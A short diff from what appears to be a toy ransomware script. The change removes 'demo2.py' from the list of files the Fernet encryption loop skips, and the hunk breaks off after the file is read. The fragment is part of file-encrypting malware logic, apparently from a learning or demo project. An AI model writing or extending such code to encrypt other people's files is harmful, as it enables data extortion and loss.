@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 def encryption(key,file_list):
     fernet = Fernet(key)
     for file in file_list:
-        if file in ['secret.key', 'ransomeware.py', 'ransome_decrypt.py', 'demo2.py']:
+        if file in ['secret.key', 'ransomeware.py', 'ransome_decrypt.py']:
             continue
         with open(file,'r') as f:
             file_data = f.read()
